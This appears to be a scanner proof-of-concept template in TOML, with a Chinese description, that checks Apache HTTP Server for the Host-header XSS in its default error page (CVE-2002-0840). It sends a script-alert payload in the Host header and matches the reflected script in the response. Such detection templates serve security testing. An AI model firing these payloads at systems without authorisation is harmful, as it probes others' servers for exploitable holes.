[info]
author = "ave"
description = "验证 Apache HTTP Server 默认错误页面对 Host 头的 XSS 漏洞（CVE-2002-0840）。当 UseCanonicalName 为 Off 且启用通配符 DNS 时，恶意 Host 头会被反射在错误页面中导致 XSS。"
id = "POC-AVE-2002-0027"
name = "CVE-2002-0840 PoC"
severity = "medium"
tags = ["ave-2002-0027"]
vuln_id = [
    "CVE-2002-0840",
    "AVE-2002-0027",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/nonexistent-path-trigger-404"
protocol = "http"

[poc.requests.headers]
Host = "<script>alert('XSS-CVE-2002-0840')</script>.example.com"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS-CVE-2002-0840')</script>"]

[[poc.requests.matchers]]
expect = true
status = [
    404,
    400,
    500,
]
type = "status"
